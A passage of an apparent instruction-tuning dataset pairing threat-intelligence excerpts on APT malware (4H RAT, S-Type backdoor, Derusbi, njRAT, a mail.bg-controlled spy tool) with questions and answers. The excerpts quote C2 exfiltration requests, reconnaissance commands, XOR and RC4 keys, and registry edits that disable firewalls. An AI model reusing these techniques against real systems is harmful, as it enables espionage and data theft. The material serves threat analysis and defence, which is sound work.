channel.\n\u2022 CCommandNOP \u2013 List the current working directory.\nscreenshot of truecaller\nDatabase shared by\nDEaDEyE JacKaL on their\ntwitter account (names\nredacted)However, other commands are not implemented in this way. these other commands contain functionality to:\n\u2022 Pause C2 activity for a random time interval.\n\u2022 Shutdown C2 activity and exit.\n\u2022 Provide a date and time before which beaconing will not resume, recorded in the file C:\\RECYCLER\\ restore.dat as noted above.\nthe use of C++ classes that inherit from a base class to carry out some of the tasking commands, along with the use of concurrency features, indicates that the developers of the rat put some thought into the architecture and design of their tool, although the decision to implement some commands outside of the class-based framework is curious, and may indicate multiple developers worked on the rat (or a single developer with shifting preferences for his coding style).\nRead the text above and answer this question: How does the 4H RAT used by PUtter Panda establish communication with its Command and Control (C2) server, and what encryption methods are employed in this process?",
    "output": "The 4H RAT establishes communication with its C2 server over HTTP. Initially, it verifies connectivity by making a distinctive request to the URI '/search?qu=' at www.google.com. A victim identifier is generated from the infected machine's hard disk serial number, XOR'ed with the key 'ldd46!yo', and then nibble-wise encoded as upper-case ASCII characters in the range (A-P). The initial beacon uses a request with four parameters (h1, h2, h3, and h4) to register the implant with the C2 server. Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Section Summary:\nSong Yubo and his research center at Southeast University appear to be central players in this narrative, as highlighted by their \u0141nancial connections to the government of China, in particular the Ministry of State Security (MSS), China's premier human intelligence agency.\nIf the MSS was involved, we can deduce that the Anthem hack could have been for the purposes of gathering sensitive information for follow-on HUMINT targeting via blackmail, asset recruitment or technical targeting operations against individuals at home.\nSong's use of the topsec email alias suggests a greater association w/ TOPSEC.\nIt seems as if the competition is almost certainly the cause for the topsec2014[.]com domain.  What is very curious, however, is the initial registration by the reseller li2384826402@yahoo[.]com, which is a tactic seen within the con\u0141rmed malicious faux VAE Inc.infrastructure.\nThe overlap between the competition website and the static command and control infrastructure seen in the Derusbi /\nSakula implant is was likely an error made by the attackers.\nBig Headline: The Company\nTo enhance our open-source capabilities, we partnered up with Dr. James Mulvenon[54] and his team of China experts at Defense Group, Inc. (DGI)[55].  We shared with them everything that we knew at the time, walking through the technical details which led us all the way to Song Yubo and the competition announcement.\nFrom there, they were able to uncover a wealth of very consequential background information on Beijing Topsec Technology Co (Beijing Topsec), the sponsoring organization for Song Yubo's information security competition.\nDGI's research indicated that Beijing Topsec is one of the largest information security hardware providers in China. In 1996, they were the \u0141rst Chinese company to break into the market with the release of China's \u0141rst indigenously-manufactured \u0141rewall. Since then, they have expanded their business to include a consulting practice focused on issues such as vulnerability mining, software code analysis, threat intelligence, and encryption R&D, amongst other things.\nThe company served as a core technical support unit for network\nsecurity at the 2008 Olympic Games \u2013 an event which was tightly controlled by the state.  Additionally, Beijing Topsec is a known partner of the Chinese military. Since 2009, the company has possessed information publication credentials for military network procurement. Since 2013, they have been publicly recognized as the Chinese equivalent of a cleared defense contractor.\nThe links between Beijing Topsec and the Chinese government are fairly substantial, highlighted by long-standing partnerships between even the most shadowy elements of the Chinese military.\nBig Headline: The Leaked Cable\nA very compelling piece of evidence is found in the contents of a leaked 2009 diplomatic security cable from the Department of State, published by The Guardian.[56] The cable is a daily digest of Diplomatic Security alerts \u2013 essentially a situational awareness primer for State Department employees to inform them of new and existing threats.  In one section, the cable highlights that the Founder of Beijing Topsec, He Weidong, had openly talked about receiving directives from the PLA in an interview with China News Network.  In the interview, the founder quite curiously states that Topsec is less a commercial entity, but rather a research institute, and that the company received about half of its start-up capital directly from the PLA.  The cable further claims that Topsec actively recruits for the PLA cyber army.\n[57]\nIt would also appear that not only does Beijing Topsec have deep ties to state-run cyber activity, but also within the independent hacker community as well.  Of note, the company hired the notorious hacker Lin Yong, a.k.a. \"Lion\" (of the Honker Union of China[59]) in the early 2000s as a security service engineer and to conduct network training.\nBig Headline: Section Summary:\nIt is not surprising that the Chinese government would be interested in partnering with a private organization such as Beijing Topsec for use as a front for state-sponsored activity.\nThe association between Southeast University and Beijing Topsec as manifested in the joint information security research center highlights the possibility of growing links between\nstate-sponsored activity and academic institutions, particularly those that receive funding from the central government.\nAll in all, it would seem that China is pursuing a uni\u0141ed approach to cyber operations, relying on all unique facets of the workforce: academia, private industry, and independent hackers, as well as the PLA to achieve their strategic goals.\nAnswer this question: How might the involvement of the Ministry of State Security (MSS) in the Anthem hack impact the nature and objectives of the cyber operation? Why would the MSS be interested in such an attack?",
    "output": "The involvement of the MSS in the Anthem hack suggests that the operation could have been aimed at gathering sensitive information for follow-on Human Intelligence (HUMINT) targeting. This includes activities such as blackmail, asset recruitment, or technical targeting operations against individuals at home. The MSS, being China's premier human intelligence agency, would be interested in such an attack to gather valuable intelligence that can be leveraged for various strategic purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5 Conclusion and Recommendations\nUkraine is vulnerable to Russia, both in traditional geopolitical space and in cyberspace. In 2015, Ukrainians are still dependent on Russian web resources, including social media (Vkontakte), email (Mail.ru), search engines (Yandex), antivirus software (Kaspersky), and much more. Our IT supply chain acquires hardware that is either produced in Russia or travels through Russia \u2013 this creates vulnerabilities out of the box, and facilitates future attacks.\nWhereas Russia is a world leader in cyber espionage and attack, Ukraine's security services are new and inexperienced. In the current conflict with Russia, the only option available to Ukraine is simply a self-inflicted denial-of-service: block access to pro-Russian sites, remove access to Russian TV channels, limit the use of Russian hardware and software, ban mobile phone and social network usage for Ukrainian soldiers, and sever network access with occupied eastern Ukraine.\nIn the future, Ukraine must modernise its cyber security legislation. One critical aspect of that process will be transparency: it must publish proposed and new laws on government websites so that they are easy to read and understand. In the past, even the few websites available were often knocked offline by hackers.\nThere have been many lessons learned. Here are some of the author's personal recommendations to the Ukrainian Government:\n\u2022 Clear Ukrainian IP space of botnets and misconfigured servers (NTP, DNS, etc.) that facilitate cyber attacks;\n\u2022 Remove illegal and pirated software from critical infrastructure and public agencies;\n\u2022 Reduce Ukraine's IT dependency in the context of crisis scenarios;\n\u2022 Implement continuity standards for media and telecoms in conflict zones;\n\u2022 Create mechanisms to reliably deliver messages from the government to its citizens in occupied territories;\n\u2022 Incorporate anti-DDoS solutions into Internet-facing services;\n\u2022 Ensure multiple, independent routes for internet traffic between Ukraine and the rest of the world;\n\u2022 Implement effective filtering mechanisms on national traffic exchange points;\n\u2022 Develop a culture of continuous cyber attack monitoring, investigation, information sharing, and research;\n\u2022 Develop strong cyber security and cryptography capabilities across Ukraine;\n\u2022 Implement effective civil society controls over unauthorised interception and collection of data;\n\u2022 Improve emergency data erasure and disaster recovery capabilities;\n\u2022 Provide resources to military and security services to effectively conduct large-scale cyber operations and computer forensics during their missions; and\n\u2022 Ensure supply chain security for IT services coming from Russia.\nFinally, the world should not underestimate Russia, which is seeking to re-establish its former empire, to include Ukraine and other parts of the defunct Soviet Union and Warsaw Pact. In the context of its wide-ranging political and military campaigns, Russia has developed a cyber attack capability that can target national critical infrastructures, via the internet, anywhere in the world.\nSmall Headline: 1 Introduction\n'Cyber attacks' and 'cyber war' are all too often characterised as independent phenomena limited to the cyber domain, somehow distinct from the broader dynamics that define a conflict. An analysis of cyber conflict thus far suggests that such a perceived dichotomy is both inaccurate and unwise. Targeted internet-based assaults cannot be divorced from their underlying geopolitical contexts, and there is small likelihood that a 'cyber war' will ever take place that is limited only to the cyber domain. On the contrary, governments have been shown to use cyber tools and tactics as a broad instrument of statecraft, a tool for coercion, and a complement to kinetic forces in conflict scenarios.\nMoscow's strategy in Ukraine has included a substantial investment in espionage and information operations, relying on the success of integrated cyber operations and computer network exploitation in particular. Russian cyber activities have included cyber espionage, 'prepping the battlefield', selective telegraphing of capabilities, and some hints at destructive activity. Together, these operations have no doubt inexorably contributed to Moscow's advantages over Kyiv, both on the ground and in shaping the con-\nMoscow's strategy in Ukraine has included a substantial investment in information operations.\nflict's narrative in the public arena. This orchestration should come as no surprise to Russian security analysts, as such an integrated approach is consistent with published Russian military doctrine. Russian strategic thinkers do not consider 'cyber war' (or even the prefix 'cyber') as a distinct concept. Rather, computer network operations are tools to be integrated into broader efforts to maintain political and military dominance in a given theatre and, more broadly, in the domestic and global courts of public opinion.\nThis chapter will ground strategic thinking on cyber conflict against the systematic cyber espionage that we believe Russia is leveraging in its conflict with Ukraine. Rather than a 'cyber war' waged in a distinct networked domain, Russia's strategy has been to masterfully exploit the information gleaned from its worldwide computer network exploitation campaigns to inform its conduct, purposely distort public opinion, and maintain its dominant position in Ukraine.\nThe author will examine three types of interrelated Russian cyber operations from a technical and targeting perspective:\n1. Computer network exploitation (CNE) to gain a decisive information advantage;\n2. 'Prepping the battlefield' via denial and deception; and\n3. Limited incidents of cyber disruption and destruction.\nSmall Headline: 2 The Architecture and Artistry of Russia's Strategic Information Theft\nSince the start of the Ukraine conflict, security companies have been increasingly tracking, cataloguing, and exposing sustained Russian CNE campaigns. Overall these Russian cyber threat groups have consistently focused on clandestinely stealing intelligence, most likely to give the Russian Government a strategic advantage. The targets of these operations have repeatedly included Ukrainian, European, and U.S. government targets, militaries, international and regional defence and political organisations, think tanks, media outlets, and dissidents. While it is difficult to assess with certainty whether these cyber threat groups are directly tasked or supported by Moscow, there is a growing body of evidence indicating these cyber actors are Russia-based, and that their activities highly likely benefit Moscow.\nThe security community's ability to detect, track, and ultimately expose Russian cyber operations seems to have improved since the Ukraine conflict began, even relative to overall trends in the industry on exposing threat activity. While determining a direct causation between the conflict in Ukraine and a seemingly marked uptick in observable Russian cyber activity is challenging, the timing is certainly notable. It is exceedingly unlikely that Russian actors only just started conducting aggressive CNE\non a global scale, so why has our ability to track and expose their activity appear to have improved? One reason may be that Russia's current national security crisis has increased its government's collections requirements to state-supported hackers, which has in turn accelerated the groups' operational tempo. As a result, it may be more difficult for these actors to modify their tactics, techniques, and procedures (TTPs) on a timely basis, which often results in them tipping their hand.\nTo shed light on how this sustained information theft is being carried out, the following sections discuss some of the cyber tactics and compromised computer infrastructure that FireEye has associated with two prominent hacker groups that we believe operate from Russia, as well as a summary list of CNE-related activity that is likely being used to give Moscow a geopolitical and military advantage.\nSmall Headline: 3 APT29 ('Advanced Persistent Threat'1 Group 29)\nAPT29 is a sophisticated and highly capable Russian cyber espionage group with a diverse, constantly evolving toolset, and talented operators. The group maintains a globally dispersed and intricate attack infrastructure that doubtless requires substantial resources to maintain. APT29's tools often leverage legitimate web services for malware command and control mechanisms, which can make them more difficult to detect because they appear to be benign communications at first glance.\nAPT29 is a highly capable Russian cyber espionage group with a constantly evolving toolset.\nVery\nQ: How does Russia integrate cyber operations into its broader military and political strategies, and what specific tactics have been observed?",
    "output": "Russia integrates cyber operations into its broader military and political strategies by using them as tools for espionage, information operations, and maintaining political and military dominance. Specific tactics observed include computer network exploitation (CNE) to gain a decisive information advantage, 'prepping the battlefield' via denial and deception, and limited incidents of cyber disruption and destruction. These operations are designed to inform Russia's conduct, distort public opinion, and maintain its dominant position in Ukraine, consistent with published Russian military doctrine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Fidelis Take\nFidelis XPS sensors detect the \"njRAT\" malware variants and domains observed throughout this report.\nFidelis XPS sensors detected the NJC242.exe/njRAT malware as \"Trojan.Win32.Jorik.Agent.rkp\". Fidelis XPS is capable of detecting this threat regardless of delivery method employed by the Threat Actors responsible. Fidelis XPS can detect and alert on executables such as the \"njRAT\" malware multiple layers deep inside of archive files (i.e. ZIP), or even XOR'ed inside of a weaponized MS Office document or Adobe PDF File. The Fidelis Threat Research and Network Forensics and Incident Response teams will continue to actively monitor the ever-evolving threat landscape for the latest threats to our customers' network security.\n\nQ: How does the Fidelis XPS sensor technology contribute to the detection of 'njRAT' malware variants, and what specific capabilities does it offer to enhance network security against such threats?",
    "output": "A: Fidelis XPS sensors are designed to detect 'njRAT' malware variants and associated domains, providing a robust defense mechanism against these threats. Specifically, Fidelis XPS identified the NJC242.exe/njRAT malware as 'Trojan.Win32.Jorik.Agent.rkp'. One of the key strengths of Fidelis XPS is its ability to detect threats irrespective of the delivery method used by the threat actors. This includes detecting executables like 'njRAT' malware even when they are nested multiple layers deep within archive files such as ZIP files, or when they are obfuscated using techniques like XOR encryption within weaponized MS Office documents or Adobe PDF files. This multi-layered detection capability significantly enhances network security by ensuring that threats are identified and alerted upon, even if they are hidden or disguised.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "New Indicators of Compromise for APT Group Nitro Uncovered\nIn mid-July of this year, we noticed yet another legitimate website had been compromised by APT actors and was serving malware. In this case, it was a group commonly referred to as \"Nitro,\" which was coined by Symantec in its 2011 (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_nitro_attacks.pdf>)whitepaper.\nAs we dug deeper, we found additional compromised legitimate websites and malware from the same group back through March of this year. In most instances, the malware is one commonly referred to as \"Spindest,\" though we also found \"PCClient\" and \"Farfli\" variants in use by the group. We don't have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites.\nHistorically, Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware, which was not seen in these attacks. Since at least 2013, Nitro appears to have somewhat modified their malware and delivery methods to include Spindest and legitimate compromised websites, as (<http://www.threatconnect.com/news/threatconnect-enables-healthy-networking-biomed-life-sciences-industry/>)reported by Cyber Squared's TCIRT. Our findings indicate they are continuing to evolve with the addition of PCClient and Farfli variants. The Maltego screenshot below shows the activity we describe in this blog.\nThese events impacted at least the following industries, across four waves:\nA US based IT Solutions provider;\nThe European office of a major, US based commercial vendor of space imagery and geospatial content;\nA European leader in power technologies and automation for utilities and industry;\nA US based provider of medical and dental imaging systems and IT solutions.\nIn July, Nitro compromised a South Korean clothing and accessories manufacturer's website to serve malware commonly referred to as \"Spindest.\" Of all the samples we've tied to this activity so far noted in this blog, this is the only one configured to connect directly to an IP address for Command and Control (C2). This IP address has been in use by this group for some time, which is interesting since they have\nevolved other components of their kill chain over time to ensure malware delivery, but oddly not altered their C2 infrastructure. It is simple for companies to block any outbound traffic to this IP, which would negate the effort Nitro put into successfully delivering the malware.\n37 AV vendors within VirusTotal properly identify it, and the PE timestamp shows the day before we saw it. In addition, the following three samples were found roughly a week apart from each other, possibly indicating the timing of the waves of activity.\n\nWhy did the APT group Nitro choose to compromise legitimate websites to deliver their malware, and how does this strategy benefit them compared to traditional spear phishing methods?",
    "output": "A: The APT group Nitro chose to compromise legitimate websites to deliver their malware as part of their evolving tactics. This strategy benefits them because it allows them to distribute malware more stealthily and effectively. By infecting legitimate sites, they can target a broader range of victims who visit these sites, increasing the likelihood of successful infection. Additionally, this method can bypass traditional email filters and user suspicion associated with spear phishing emails, making it harder for targets to detect and defend against the attack. This evolution shows Nitro's adaptability in response to changing security landscapes and the need to maintain effective malware delivery mechanisms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: NETWORK-BASED INDICATORS\nDETAILS\nThe backdoor could be executed with three different switches, \"/ok\", \"/Start\", or \"/fuck\". These switches affected the context under which the process would be run and whether or not the binary would delete itself once executed.\nThe backdoor attempted to run a number of tests to determine the privilege level of the compromised user, including whether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can access the service manager via a call to \"OpenSCManagerA\".\nThe user test was performed by utilizing the NetUserAdd and NetUserDel Windows APIs; the test attempted to create the temporary user \"Lost_{Unique Identifier}\" with the password \"fuck~!@6{Unique Identifier}\". If the secondary network protocol was activated, the backdoor would also execute two commands via the command interpreter to gather system information: \"cmd.exe /c ipconfig /all\" and \"cmd.exe /c net user {Username}\". It would temporarily write the output of these commands to the files, \"%AppData%\\{Unique Identifier}\\HOSTRURKLSR\" and \"%AppData%\\{Unique Identifier}\\NEWERSSEMP\" respectively. This information was then base64 encoded and transmitted to the C2 server within the URI of a GET request. The S-Type network protocol is described in greater detail below. Also of note is that the backdoor would continue to attempt to beacon to \"smtp.adobekr.com\" on port 25 even if communication to the secondary C2 could be established.\nThe configuration information contained within these backdoors could be decoded using the same script provided in Figure 8.\nMedium Headline: S-TYPE BACKDOOR (2013-2014)\nAfter experimenting with a hybrid of the Misdat and S-Type backdoors, in 2013 Operation Dust Storm abandoned the earlier Misdat network protocol entirely. This was likely a direct result of the demonstrated effectiveness of an HTTP-based protocol for command and control, or simply an adaptation to more corporations leveraging web-based proxies. All samples identified were programmed using Borland Delphi and made use of custom classes to implement common backdoor functionality. The majority of samples SPEAR identified in 2013 were packed with UPX version 3.03, while later 2014 variants were not.\nMedium Headline: NETWORK-BASED INDICATORS\nThe backdoor communicated to \"ssl.projectscorp.net\" and \"pic.elecarrow.com\" primarily on port 80; however, communication would also fallback to port 443 or 8080 if initial communication failed. The backdoor used HTTP to communicate with the C2 servers; data was transmitted base64 encoded in the URI of GET requests or sent in the body of a POST request. It used two hardcoded User-Agents, \"FirefoxApp\" and \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)\" in initial requests, as well as the default User-Agent of the system in its later communications.\nExample HTTP requests are presented in the figures below.\nFigure 17: Initial POST Requests Sent by the S-Type Backdoor\nPOST hxxp://pic.elecarrow.com:80//Item/2016757.aspx HTTP/1.1\nAccept: */* Content-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1)\nHost: pic.elecarrow.com:80\nContent-Length: 93 Connection: Keep-Alive\nCache-Control: no-cache\nPOST /pic/index.asp HTTP/1.1\nAccept: Accept: */*, /pic/index.asp, ssl.projectscorp.net\nContent-Type: application/x-www-form-urlencoded User-Agent: FirefoxApp\nHost: ssl.projectscorp.net Content-Length: 354\nCache-Control: no-cache\nid=E8C465FC&type=post&stype=info&data=VVNFUi1ENjkyMUY2MjE1fFdpbmRvd-3MgWFAvQWRtaW5pc3RyYXRvcnwxzOwyM9ChyrE0M7fWfFRaLTEzMTAxM3wNClVTRVIt-RDY5MjFGNjIxNS9BZG1pbmlzdHJhdG9yL0FkbWluaXN0cmF0b3JzDQpDcmVhdGUgVXNl-ciBFcnJvci4gMA0KQ3JlYXRlIERpcmVjdG9yeSBTdWNjZXNzLg0KT3BlblNjTWFuYWdl-ciBPSy4NCkZpbGVTeXN0ZW0gOiBOVEZTDQpObyBBdXRvQ29uZmlnVVJMLg0KTm8gUHJveHlB-ZGRyZXNzLg==\nGET /pic/index.asp?id=E8C465FC&type=ie&stype=info&data=VVNFUi1ENjkyMUY2M-jE1fFdpbmRvd3MgWFAvQWRtaW5pc3RyYXRvcnwxzOwyM9ChyrE0M7fWfFRaLTEzMTAxM3wNClVTR-VItRDY5MjFGNjIxNS9BZG1pbmlzdHJhdG9yL0FkbWluaXN0cmF0b3JzDQpDcmVhdGUgVXN-lciBFcnJvci4gMA0KQ3JlYXRlIERpcmVjdG9yeSBTdWNjZXNzLg0KT3BlblNjTWFuYWdlciBPSy4N-CkZpbGVTeXN0ZW0gOiBOVEZTDQpObyBBdXRvQ29uZmlnVVJMLg0KTm8gUHJveHlBZGRyZXNzLg==\nHTTP/1.1 Accept: */*\nAccept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR\n1.1.4322)\nAccept-Encoding: gzip, deflate\nHost: ssl.projectscorp.net\nConnection: Keep-Alive\nGET /pic/index.asp?mmid=E8C465FC HTTP/1.1\nAccept: */* Accept-Language: en-us\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nAccept-Encoding: gzip, deflate Host: ssl.projectscorp.net\nConnection: Keep-Alive\nFigure 18: Sample Get Requests Sent by the S-Type Backdoor\n{Hostname}|Windows XP/{Username}|1??23\u0421\u02b143??|TZ-131013|\n{Hostname}/{Username}/Administrators Create User Error. 0\nCreate Directory Success.\nOpenScManager OK. FileSystem : NTFS No AutoConfigURL. No ProxyAddress.\nFigure 19: Decoded Data Parameter from Figure Above\nThe backdoor attempts to run a number of tests to determine the privilege level of the compromised user, including whether or not a user can be added to the system, whether a directory can be created in the %System% folder, and whether the user can access the service manager. This information is transmitted along with the type of file system and any proxy information necessary to access the Internet. The backdoor may also make network requests with the following variables in the URI \"&type=ie&\", \"stype=info&data=\", \"stype=srv&data=\", \"stype=con&data=\", \"stype=user&data=\", \"mmid=\", \"&type=post&stype=\", or \"&status=\".\n\nWhy did Operation Dust Storm transition from the Misdat network protocol to the S-Type backdoor in 2013, and what were the primary characteristics of this new backdoor?",
    "output": "Operation Dust Storm transitioned from the Misdat network protocol to the S-Type backdoor in 2013 likely due to the demonstrated effectiveness of an HTTP-based protocol for command and control, or as an adaptation to more corporations leveraging web-based proxies. The primary characteristics of the S-Type backdoor included being programmed using Borland Delphi, implementing common backdoor functionality through custom classes, and initially being packed with UPX version 3.03, while later 2014 variants were not.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: EXECUTIVE SUMMARY\n,Q\ue003ODWH\ue003'HFHPEHU\ue003\ue015\ue013\ue014\ue014\ue00f\ue003&URZG6WULNH\ue00f\ue003,QF\ue011\ue003UHFHLYHG\ue003WKUHH\ue003ELQDU\\\ue003H[HFXWDEOH\ue003\u00bfOHV\ue003WKDW\ue003ZHUH\ue003VXVSHFWHG\ue003RI\ue003 KDYLQJ\ue003EHHQ\ue003LQYROYHG\ue003LQ\ue003D\ue003VRSKLVWLFDWHG\ue003DWWDFN\ue003DJDLQVW\ue003D\ue003ODUJH\ue003)RUWXQH\ue003\ue018\ue013\ue013\ue003FRPSDQ\\\ue011\ue003\ue0037KH\ue003\u00bfOHV\ue003ZHUH\ue003 DQDO\\]HG\ue003WR\ue003XQGHUVWDQG\ue003\u00bfUVW\ue003LI\ue003WKH\\\ue003ZHUH\ue003LQ\ue003IDFW\ue003PDOLFLRXV\ue00f\ue003DQG\ue003WKH\ue003OHYHO\ue003RI\ue003VRSKLVWLFDWLRQ\ue003RI\ue003WKH\ue003VDPSOHV\ue011\ue003\ue003\nThe samples were clearly malicious and varied in sophistication.   All three samples provided remote access to the attacker, via two Command and Control (C2) servers.  One sample is typical of what is commonly referred to as a 'dropper' because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system.  The malicious component in this case is what is commonly referred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed as a service.  The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor.  The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools.  This third component is likely used for long-term implantation and intelligence gathering.  Some AV engines occasionally identify this sample as Derusbi Trojan.  CrowdStrike Intelligence Team has seen Trojans from 8 different builder variants of this RAT, including 64-bit versions, used in targeted attacks in 2011 against Defense, Energy/Power, and Chemical Industries in US and Japan.\n$OO\ue003RI\ue003WKHVH\ue003VDPSOHV\ue003UH\u00c0HFW\ue003FRPPRQ\ue003WRROPDUNV\ue003DQG\ue003WUDGHFUDIW\ue003FRQVLVWHQW\ue003ZLWK\ue003&KLQHVH\ue003EDVHG\ue003DFWRUV\ue003ZKR\ue003 target various strategic interests of the United States including High Tech/Heavy Industry, Non-Governmental Organizations (NGOs), State/Federal Government, Defense Industrial Base (DIB), and organizations with vast economic interests.  This report contains an in-depth technical analysis of the samples, detection/remediation/mitigation information, attribution intelligence, and a conclusion aimed at providing the reader with a synopsis of the report.\n\nBased on the above text, answer a question. How does DeepPanda utilize different types of malware components to achieve its objectives? Explain the roles of each component and how they contribute to the overall attack strategy.",
    "output": "DeepPanda utilizes three distinct malware components to achieve its objectives. The first component is a 'dropper,' which writes a malicious component to disk and connects it to the targeted host's operating system. This component installs a Remote Access Tool (RAT) manifested as a Dynamic Link Library (DLL) service, providing the attacker with remote access. The second component is a dual-use tool that functions as a post-exploitation tool, capable of infecting other systems, downloading additional tools, removing log data, and acting as a backdoor. The third component is a sophisticated implant with multiple communication capabilities and the ability to act as a relay for other infected hosts. It uses a kernel-mode driver to hide aspects of the tool from user-mode tools, making it suitable for long-term implantation and intelligence gathering. This third component is sometimes identified as the Derusbi Trojan by some antivirus engines.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Infecting a system\nThe initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware. It does not maintain exports and simply delivers another encrypted library maintained in its resource section. This second library performs all the espionage functionality.\nWhen running on Windows 7, the malicious library uses the Metasploit Framework's open-source code Win7Elevate to inject malicious code into explorer.exe. In any case, be it Windows 7 or not, this malicious code decrypts its spying library from resources, saves it to disk with an apparently random but hardcoded name, for example, ~DFE8B437DD7C417A6D.TMP, in the user's temporary folder and loads this file as library.\nThis next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name -- either KBDLV2.DLL or AUTO.DLL, depending on the malware sample. Then the service is created for the service dll. Service names also can differ from version to version; we discovered the following names -- DriverManage, WebService and WebClientManager. These functions assure malware\npersistence in a compromised OS between system reboots.\nAt this stage, the malware gathers information about the infected computer. This includes an output of the systeminfo command saved in the file oledvbs.inc by following the hardcoded path: C:Program FilesCommon FilesSystemOle DBoledvbs.inc. There is another function called - the malware creates a string containing computer and user names but this isn't used anywhere. By all appearances, this is a mistake by the malware author. Later on, we will come to a function where such a string could be pertinent but the malware is not able to find this data in the place where it should be. These steps are taken only if it's running on an infected system for the first time. At system startup, the malicious library performs spying activities when it confirms that it is loaded by the generic svchost.exe process.\nBig Headline: Spying modules\nThere are a lot of malicious programs involved in this campaign but, strangely, they each implement a single spying function. Besides the basic library (KBDLV2.DLL / AUTO.DLL) that is responsible for\ncommon communication with its campaign master, we were able to find modules performing the following functions:\nKeystroke logging\nDirectory listing collection\nHWP document theft\nRemote control download and execution\nRemote control access\nBig Headline: Disabling firewall\nAt system startup, the basic library disables the system firewall and any AhnLab firewall (a South Korean security product vendor) by zeroing out related values in registry:\nSYSTEMCurrentControlSetServicesSharedAccessParameters\nFirewallPolicyStandardProfile\nEnableFirewall = 0\nSYSTEMCurrentControlSetServicesSharedAccessParameters\nFirewallPolicyPublicProfile\nEnableFirewall = 0\nHKLMSOFTWAREAhnLabV3IS2007InternetSec\nFWRunMode = 0\nHKLMSOFTWAREAhnlabV3IS80is\nfwmode = 0\nIt also turns off the Windows Security Center service to prevent alerting the user about the disabled firewall.\nOnce the malware disables the AhnLab firewall, it checks whether the file taskmgr.exe is located in the hardcoded C:WINDOWS folder. If the file is present, it runs this executable. Next, the malware loops every 30 minutes to report itself and wait for response from its operator.\nBig Headline: Communications\nCommunication between bot and operator flows through the Bulgarian web-based free email server (mail.bg). The bot maintains hardcoded credentials for its e-mail account. After authenticating, the malware sends e-mails to another specified e-mail address, and reads e-mails from the inbox. All these activities are performed via the \"mail.bg\" web-interface with the use of the system Wininet API functions. From all the samples that we managed to obtain, we extracted the following email accounts used in this campaign:\nbeautifl@mail.bg ennemyman@mail.bg fasionman@mail.bg happylove@mail.bg lovest000@mail.bg monneyman@mail.bg sportsman@mail.bg veryhappy@mail.bg\nHere are the two \"master\" email addresses to which the bots send e-mails on behalf of the above-mentioned accounts. They report on status and transmit infected system information via attachments:\niop110112@hotmail.com rsh1213@hotmail.com\nBig Headline: Regular reporting\nTo report infection status, the malware reads from C:Program FilesCommon FilesSystemOle DBoledvbs.inc which contains the systeminfo command output. If the file exists, it is deleted after reading.\nThen, it reads user-related info from the file sqlxmlx.inc in the same folder (we can see strings referencing to \"UserID\" commentary in this part of the code). But this file was never created. As you recall, there is a function that should have collected this data and should have saved it into this sqlxmlx.inc file. However, on the first launch, the collected user information is saved into \"xmlrwbin.inc\". This effectively means that the malware writer mistakenly coded the bot to save user information into the wrong file. There is a chance for the mistaken code to still work -- user information could be copied into the send information heap. But not in this case - at the time of writing, the gathered user information variable which should point to the xmlrwbin.inc filename has not yet been initialized, causing the file write to fail. We see that sqlxmlx.inc is not created to store user information.\nNext, the intercepted keystrokes are read from the file and sent to the master. Keystrokes are logged and kept in an ordinary and consistent format in this file - both the names of windows in which keys were typed and the actual sequence of keyboard entry. This data is found in the file C:Program FilesCommon FilesSystemOle DBmsolui80.inc created by the external key logger module.\nAll this data is merged in one file xmlrwbin.inc, which is then encrypted with RC4. The RC4 key is generated as an MD5 hash of a randomly generated 117-bytes buffer. To be able to decipher the data, the attacker should certainly know either the MD5 hash or the whole buffer content. This data is also sent, but RSA encrypted. The malware constructs a 1120 bit public key, uses it to encrypt the 117-bytes buffer. The malware then concatenates all the data to be sent as a 128-bytes block. The resulting data is saved in C:Program FilesCommon FilesSystemOle DB to a file named according to the following format:\n\"<system time>_<account at Bulgarian email server>.txt\", for example, \"08191757_beautifl@mail.bg.txt\".\nThe file is then attached to an e-mail and sent to the master's e-mail account. Following transmission, it is immediately deleted from the victim system.\nBig Headline: Getting the master's data\nThe malware also retrieves instructions from the mail server. It checks for mails in its Bulgarian e-mail account with a particular subject tag. We have identified several \"subject tags\" in the network communication: Down_0, Down_1, Happy_0, Happy_2 and ddd_3. When found and the e-mail maintains an attachment, the malware downloads this attachment and saves it with filename \"msdaipp.cnt\" in C:Program FilesCommon FilesSystemOle DB. The attacker can send additional executables in this way. The executables are RC4 encrypted and then attached. The key for decryption is hardcoded in the malicious samples. It's interesting that the same \"rsh!@!#\" string is maintained across all known samples and is used to generate RC4 keys. As described earlier, the malware computes the MD5 of this string and uses the hash as its RC4 key to decrypt the executable. Then, the plain executable is dropped onto disk as \"sqlsoldb.exe\" and run, and then moved to the 